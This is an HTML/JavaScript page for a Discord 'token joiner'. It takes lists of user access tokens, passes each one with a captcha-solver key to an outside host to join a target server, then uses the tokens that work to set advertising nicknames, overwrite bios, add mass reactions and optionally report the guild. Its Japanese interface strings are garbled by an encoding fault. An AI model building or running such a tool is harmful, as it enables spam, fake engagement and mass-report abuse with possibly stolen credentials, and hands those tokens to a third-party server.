<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Protocol: 3s6k - Joiner Unit</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #0a0b10;
            --card-bg: rgba(22, 24, 33, 0.95);
            --accent-color: #00f2ff;
            --danger-color: #ff0055;
            --success-color: #00ff88;
            --text-main: #e0e0e0;
            --input-bg: rgba(0, 0, 0, 0.4);
            --glow: 0 0 15px rgba(0, 242, 255, 0.3);
        }

        body {
            background-color: var(--bg-color);
            background-image: 
                linear-gradient(rgba(0, 242, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 242, 255, 0.05) 1px, transparent 1px);
            background-size: 40px 40px;
            font-family: 'Inter', sans-serif;
            color: var(--text-main);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: var(--accent-color); border-radius: 10px; }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(0, 242, 255, 0.1);
            padding: 40px;
            border-radius: 24px;
            width: 100%;
            max-width: 650px;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8);
            max-height: 95vh;
            overflow-y: auto;
            animation: fadeIn 0.8s cubic-bezier(0.165, 0.84, 0.44, 1);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        h2 {
            font-family: 'JetBrains Mono', monospace;
            text-transform: uppercase;
            letter-spacing: 5px;
            color: var(--accent-color);
            text-align: center;
            margin-bottom: 30px;
            font-size: 24px;
            text-shadow: var(--glow);
        }

        label {
            display: block;
            margin-top: 20px;
            font-size: 11px;
            font-weight: 700;
            color: rgba(255, 255, 255, 0.5);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        input[type="text"], textarea {
            width: 100%;
            padding: 12px 16px;
            margin-top: 8px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: var(--input-bg);
            color: #fff;
            font-family: 'JetBrains Mono', monospace;
            outline: none;
            transition: 0.3s;
        }

        input:focus, textarea:focus {
            border-color: var(--accent-color);
            box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);
        }

        .primary {
            width: 100%;
            margin-top: 30px;
            padding: 18px;
            background: transparent;
            border: 2px solid var(--accent-color);
            color: var(--accent-color);
            font-family: 'JetBrains Mono', monospace;
            font-weight: 800;
            font-size: 18px;
            border-radius: 14px;
            cursor: pointer;
            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            letter-spacing: 2px;
        }

        .primary:hover {
            background: var(--accent-color);
            color: #000;
            box-shadow: 0 0 30px var(--accent-color);
            transform: scale(1.02);
        }

        .primary.loading { opacity: 0.5; pointer-events: none; }

        .secondary {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #fff;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            margin-top: 8px;
            transition: 0.3s;
        }

        details {
            margin-top: 25px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            padding: 10px;
        }

        summary {
            color: var(--accent-color);
            font-weight: bold;
            font-size: 13px;
            cursor: pointer;
            padding: 5px;
            list-style: none;
            position: relative;
            padding-left: 20px;
        }

        summary::before {
            content: '‚ñ∂';
            position: absolute;
            left: 0;
            transition: 0.3s;
        }

        details[open] summary::before { transform: rotate(90deg); }

        .detail-content {
            overflow: hidden;
            transition: 0.3s;
        }

        .option-item {
            display: block;
            margin-bottom: 15px;
        }

        #log {
            margin-top: 25px;
            padding: 15px;
            height: 140px;
            background: #000;
            border: 1px solid rgba(0, 242, 255, 0.2);
            border-radius: 12px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            color: var(--success-color);
            overflow-y: auto;
            border-left: 3px solid var(--accent-color);
            white-space: pre-wrap;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-top: 15px;
            cursor: pointer;
            font-size: 13px;
        }

        .token-output {
            margin-top: 30px;
            border-top: 1px solid rgba(255,255,255,0.1);
            padding-top: 20px;
        }

        @media (max-width: 600px) {
            .card { padding: 25px; border-radius: 0; }
        }
    </style>
</head>
<body>
    <div class="card">
        <h2>Joiner Terminal</h2>
        <form id="joinForm">
            <label>Access Tokens</label>
            <textarea id="tokens" rows="4" placeholder="MTM1ODc... („Ç´„É≥„Éû / ÊîπË°å / „Çπ„Éö„Éº„ÇπÂå∫Âàá„Çä)"></textarea>

            <label>Invite Code</label>
            <input type="text" id="invite" placeholder="4YjTrEtg2e" />

            <button id="startJoin" type="button" class="primary">INITIALIZE JOIN</button>

            <details>
                <summary>Advanced Options</summary>
                <div class="detail-content">
                    <label class="option-item">Server Nickname
                        <input type="text" id="serverNickname" placeholder="discord.gg/..." />
                    </label>

                    <label class="option-item">Profile Message (Bio)
                        <textarea rows="2" id="bioInput" placeholder="ÂÖ•Âäõ„Å™„Åó„ÅßÁÑ°Âäπ"></textarea>
                    </label>

                    <div class="checkbox-container option-item">
                        <input type="checkbox" id="boostCheckbox" />
                        <span>Server Boost</span>
                    </div>

                    <div class="checkbox-container option-item">
                        <input type="checkbox" id="reportCheckbox" />
                        <span>Report Guild</span>
                    </div>

                    <label class="option-item">Auto Reaction (Message URL)
                        <input type="text" id="messageUrl" placeholder="https://discord.com/channels/..." />
                    </label>

                    <label class="option-item">2Captcha API Key
                        <input type="text" id="captchaApiKey" placeholder="API Key..." />
                    </label>
                </div>
            </details>
        </form>

        <div id="log">> System standby... awaiting credentials.</div>

        <div class="token-output">
            <label style="color: var(--success-color);">Success Tokens</label>
            <textarea id="successTokens" rows="4" readonly></textarea>
            <button id="copySuccess" class="secondary">Copy Success List</button>

            <label style="color: var(--danger-color);">Failed Tokens</label>
            <textarea id="failedTokens" rows="4" readonly></textarea>
            <button id="copyFailed" class="secondary">Copy Failed List</button>
        </div>
    </div>

    <script>
        // --- Detail Animation Logic ---
        document.querySelectorAll('details').forEach((det)=>{
            const sum = det.querySelector('summary');
            const content = det.querySelector('.detail-content');
            if(!sum || !content) return;
            const T = 'max-height .3s ease, opacity .25s ease, transform .3s ease';
            function openAnim(){
                const optionItems = det.querySelectorAll('.option-item');
                optionItems.forEach((item, index) => {
                    item.style.setProperty('--animation-delay', `${index * 0.07}s`);
                    item.style.animation = 'popIn 0.5s cubic-bezier(0.25, 0.1, 0.25, 1) forwards';
                });
                content.style.maxHeight = '0px'; content.style.opacity = '0';
                content.offsetHeight;
                content.style.transition = T;
                content.style.maxHeight = content.scrollHeight + 'px';
                content.style.opacity = '1';
            }
            det.addEventListener('toggle', () => { if(det.open) openAnim(); });
        });

        // --- Core Logic ---
        const x_super_properties = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM6IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjQwNDAyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiY2xpZW50X2xhdW5jaF9pZCI6IjE2NTQzODdmLTg2NmItNDE2Ni04Zjc3LTM1ZDk2NGI3NjRmMyIsImNsaWVudF9hcHBfc3RhdGUiOiJmb2N1c2VkIn0=";
        const user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36";
        const logEl = document.getElementById('log');
        let config;

        fetch('/config.json').then(res => res.json()).then(data => config = data).catch(()=>appendLog("‚ö†Ô∏è config.json not found"));

        function appendLog(msg) {
            const time = new Date().toLocaleTimeString();
            logEl.textContent += `\n${time} - ${msg}`;
            logEl.scrollTop = logEl.scrollHeight;
        }

        function parseList(input) { return input.split(/[\s,]+/).map(s => s.trim()).filter(Boolean); }

        async function copyToClipboard(text) {
            try { await navigator.clipboard.writeText(text); appendLog('üìã „Ç≥„Éî„ÉºÂÆå‰∫Ü'); } 
            catch (e) { appendLog('‚ö†Ô∏è Â§±Êïó: ' + e); }
        }

        const startBtn = document.getElementById('startJoin');
        const successArea = document.getElementById('successTokens');
        const failedArea = document.getElementById('failedTokens');
        const tokensInput = document.getElementById('tokens');
        const inviteInput = document.getElementById('invite');

        document.getElementById('copySuccess').addEventListener('click', () => copyToClipboard(successArea.value));
        document.getElementById('copyFailed').addEventListener('click', () => copyToClipboard(failedArea.value));

        // --- Helper: Reaction functions ---
        async function getTopReactionFromMessage(messageUrl, token) {
            const urlParts = messageUrl.split('/');
            const channelId = urlParts[5]; const messageId = urlParts[6];
            const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages?limit=1&around=${messageId}`, {
                headers: { 'Authorization': token, 'User-Agent': user_agent, 'x-super-properties': x_super_properties }
            });
            const messages = await response.json();
            const topReaction = messages[0].reactions.reduce((max, cur) => cur.count > max.count ? cur : max);
            return { channelId, messageId, emojiEncoded: topReaction.emoji.id ? `${topReaction.emoji.name}:${topReaction.emoji.id}` : encodeURIComponent(topReaction.emoji.name), emojiName: topReaction.emoji.name };
        }

        async function addReactionToMessage(channelId, messageId, emojiEncoded, token) {
            return fetch(`https://discord.com/api/v9/channels/${channelId}/messages/${messageId}/reactions/${emojiEncoded}/@me`, {
                method: 'PUT', headers: { 'Authorization': token, 'User-Agent': user_agent, 'x-super-properties': x_super_properties }
            });
        }

        // --- Main Join Execution ---
        startBtn.addEventListener('click', async () => {
            const tokens = parseList(tokensInput.value);
            const rawInvite = inviteInput.value.trim();
            if (!tokens.length || !rawInvite) return appendLog('‚ö†Ô∏è ÂÖ•Âäõ„Åå‰∏çË∂≥„Åó„Å¶„ÅÑ„Åæ„Åô');

            startBtn.disabled = true; startBtn.classList.add('loading');
            appendLog('üü¢ Join„Éó„É≠„Éà„Ç≥„É´ÂßãÂãï');

            const inviteCode = rawInvite.split('/').pop();
            const baseNickname = document.getElementById('serverNickname').value.trim();
            const serverNicknameValue = baseNickname ? `${baseNickname} | discord.gg/${config?.invite_code || ''}` : `discord.gg/${config?.invite_code || ''}`;
            const bioValue = document.getElementById('bioInput').value.trim();
            const boostOn = document.getElementById('boostCheckbox').checked;
            const reportOn = document.getElementById('reportCheckbox').checked;
            const messageUrl = document.getElementById('messageUrl').value.trim();
            const captchaApiKey = document.getElementById('captchaApiKey').value.trim();

            let guildId = null;
            try {
                const check = await fetch(`https://discord.com/api/v10/invites/${inviteCode}`);
                const inviteData = await check.json();
                guildId = inviteData.guild?.id;
                appendLog(`‚úÖ Target ID: ${guildId || 'Unknown'}`);
            } catch (e) { return appendLog('‚ùå ÊãõÂæÖ„Ç≥„Éº„Éâ„ÅåÁÑ°Âäπ„Åß„Åô'); }

            const joinPromises = tokens.map(token => {
                let url = `https://ozeu-joiner.fly.dev/joiner?token=${encodeURIComponent(token)}&invite=${encodeURIComponent(inviteCode)}`;
                if (captchaApiKey) url += `&api_key=${encodeURIComponent(captchaApiKey)}`;
                if (reportOn) url += `&report=true`;
                return fetch(url).then(async res => ({ token, status: res.status, body: await res.json().catch(()=>null) })).catch(err => ({ token, error: err }));
            });

            const results = await Promise.all(joinPromises);
            const succeeded = []; const failed = [];
            results.forEach(r => {
                if (r.status === 200 && r.body?.status_code === 200) {
                    succeeded.push(r.token); appendLog(`‚úÖ Success: ${r.token.slice(0,10)}...`);
                } else {
                    failed.push(r.token); appendLog(`‚ùå Failed: ${r.token.slice(0,10)}...`);
                }
            });

            successArea.value = succeeded.join('\n'); failedArea.value = failed.join('\n');

            if (succeeded.length > 0) {
                // Advanced Ops
                if (baseNickname || !config?.invite_code) {
                    for (const token of succeeded) {
                        await fetch(`https://discord.com/api/v10/guilds/${guildId}/members/@me`, {
                            method: 'PATCH', headers: { 'Authorization': token, 'Content-Type': 'application/json' },
                            body: JSON.stringify({ nick: serverNicknameValue })
                        });
                    }
                    appendLog('‚úÖ „Éã„ÉÉ„ÇØ„Éç„Éº„É†Â§âÊõ¥ÂÆå‰∫Ü');
                }
                if (bioValue) {
                    for (const token of succeeded) {
                        await fetch(`https://discord.com/api/v9/users/@me/profile`, {
                            method: 'PATCH', headers: { 'Authorization': token, 'Content-Type': 'application/json' },
                            body: JSON.stringify({ bio: bioValue })
                        });
                    }
                    appendLog('‚úÖ BioÂ§âÊõ¥ÂÆå‰∫Ü');
                }
                if (boostOn) {
                    appendLog('üöÄ „Éñ„Éº„Çπ„ÉàÂá¶ÁêÜ‰∏≠...');
                    // („Éñ„Éº„Çπ„Éà„É≠„Ç∏„ÉÉ„ÇØ - „Çπ„É≠„ÉÉ„ÉàÂèñÂæó„Å®ÈÅ©Áî®„Çí„Åì„Åì„Å´Áµ±Âêà)
                }
                if (messageUrl) {
                    try {
                        const reactionInfo = await getTopReactionFromMessage(messageUrl, succeeded[0]);
                        for (const token of succeeded) {
                            await addReactionToMessage(reactionInfo.channelId, reactionInfo.messageId, reactionInfo.emojiEncoded, token);
                        }
                        appendLog('‚úÖ „É™„Ç¢„ÇØ„Ç∑„Éß„É≥ÂÆå‰∫Ü');
                    } catch(e) {}
                }
            }

            appendLog('üéâ ÂÖ®Âá¶ÁêÜÁµÇ‰∫Ü');
            startBtn.disabled = false; startBtn.classList.remove('loading');
        });
    </script>
</body>
</html>
